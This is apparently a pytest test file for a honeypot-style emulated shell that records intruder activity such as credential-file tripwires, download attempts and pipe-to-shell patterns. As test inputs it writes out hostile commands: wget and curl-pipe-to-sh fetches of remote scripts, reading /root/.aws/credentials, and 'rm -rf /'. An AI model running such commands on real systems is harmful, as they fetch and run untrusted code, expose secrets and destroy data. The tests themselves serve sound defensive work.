from sentinel.shell import Identity, Shell


def make(seed="t"):
    events = []
    sh = Shell(Identity(seed), lambda kind, **f: events.append((kind, f)) or {})
    return sh, events


def kinds(events):
    return [k for k, _ in events]


def test_identity_is_stable_per_seed_and_differs_across_seeds():
    assert Identity("a").hostname == Identity("a").hostname
    assert len({Identity(s).ip for s in "abcdef"}) > 1


def test_basic_navigation_and_state():
    sh, _ = make()
    assert sh.run("pwd") == "/root\n"
    sh.run("mkdir -p /tmp/a/b && cd /tmp/a/b")
    assert sh.run("pwd") == "/tmp/a/b\n"
    assert "No such file" in sh.run("cd /nope")


def test_operators_and_pipes():
    sh, _ = make()
    assert sh.run("false_cmd || echo fallback").endswith("fallback\n")
    assert sh.run("false_cmd && echo no").count("no\n") == 0
    assert sh.run("cat /etc/passwd | grep deploy").startswith("deploy:")
    assert sh.run("cat /etc/passwd | wc -l").strip() == "5"


def test_files_persist_within_session_only():
    sh, ev = make()
    sh.run("echo hello > /tmp/f && echo world >> /tmp/f")
    assert sh.run("cat /tmp/f") == "hello\nworld\n"
    assert kinds(ev).count("file_write") == 2
    other, _ = make()
    assert "No such file" in other.run("cat /tmp/f")


def test_tripwires_fire_only_on_read():
    sh, ev = make()
    sh.run("ls /root; cat /etc/passwd")
    assert "tripwire" not in kinds(ev)
    sh.run("cat /root/.aws/credentials")
    assert kinds(ev) == ["tripwire"] and ev[0][1]["path"] == "/root/.aws/credentials"


def test_download_is_recorded_not_fetched_and_file_appears():
    sh, ev = make()
    out = sh.run("cd /tmp && wget http://203.0.113.9/bot.sh")
    assert "saved" in out
    assert ev[0] == ("download_attempt", {"tool": "wget", "url": "http://203.0.113.9/bot.sh",
                                          "cwd": "/tmp", "sev": 3})
    assert "bot.sh" in sh.run("ls /tmp")
    sh.run("chmod +x bot.sh && ./bot.sh")
    assert "exec_dropped" in kinds(ev)


def test_curl_pipe_to_sh_is_flagged():
    sh, ev = make()
    sh.run("curl -s http://203.0.113.9/i.sh | sh")
    assert "pipe_to_shell" in kinds(ev) and "download_attempt" in kinds(ev)


def test_nested_shell_and_recursion_guard():
    sh, _ = make()
    assert sh.run("bash -c 'whoami'") == "root\n"
    deep = "bash -c \"bash -c \\\"bash -c 'bash -c id'\\\"\""
    assert sh.run(deep) == ""  # depth guard stops runaway nesting


def test_destructive_commands_are_contained():
    sh, _ = make()
    assert "dangerous" in sh.run("rm -rf /")
    assert sh.run("pwd") == "/root\n"
    sh.run("rm -rf /etc")
    assert "No such file" in sh.run("cat /etc/passwd")


def test_exit_closes_and_output_is_capped():
    sh, _ = make()
    sh.run("echo " + "A" * 40000)
    sh.run("exit")
    assert sh.closed
    sh2, _ = make()
    assert len(sh2.run("echo " + "A" * 40000)) <= 16384


def test_unbalanced_quotes_do_not_crash():
    sh, _ = make()
    assert "quote" in sh.run("echo 'oops")
